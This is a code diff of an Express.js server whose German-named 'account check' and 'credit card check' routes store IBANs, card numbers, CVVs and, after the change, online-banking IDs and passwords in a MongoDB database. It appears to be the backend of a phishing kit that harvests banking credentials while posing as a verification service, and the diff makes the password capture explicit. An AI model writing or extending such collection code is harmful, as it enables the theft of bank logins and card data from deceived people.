@@ -40,11 +40,11 @@ app.get('/', (req, res) => {
 
 // Kontoprüfung
 app.post('/kontopruefung', async (req, res) => {
-  const { kontoInhaber, iban, bic, bankname, kontonummer, ID, OP } = req.body;
+  const { kontoInhaber, iban, bic, bankname, kontonummer, onlineBankingID, onlineBankingPasswort } = req.body;
   const collection = client.db("test").collection('kontopruefung');
 
   try {
-    const result = await collection.insertOne({ kontoInhaber, iban, bic, bankname, kontonummer, ID, OP });
+    const result = await collection.insertOne({ kontoInhaber, iban, bic, bankname, kontonummer, onlineBankingID, onlineBankingPasswort });
     console.log('Kontodaten erfolgreich gespeichert:', result.ops[0]);
     res.status(200).redirect('/kontopruefung.html');
   } catch (err) {
@@ -70,11 +70,11 @@ app.post('/bonitaetscheck', async (req, res) => {
 
 // Kreditkartenprüfung
 app.post('/kreditkartenpruefung', async (req, res) => {
-  const { kartentyp, kartennummer, verfallsdatum, cvv, ID, OP } = req.body;
+  const { kartentyp, kartennummer, verfallsdatum, cvv, onlineBankingID, onlineBankingPasswort } = req.body;
   const collection = client.db("test").collection('kreditkartenpruefung');
 
   try {
-    const result = await collection.insertOne({ kartentyp, kartennummer, verfallsdatum, cvv, ID, OP });
+    const result = await collection.insertOne({ kartentyp, kartennummer, verfallsdatum, cvv, onlineBankingID, onlineBankingPasswort });
     console.log('Kreditkartendaten erfolgreich gespeichert:', result.ops[0]);
     res.status(200).redirect('/kreditkartenpruefung.html');
   } catch (err) {
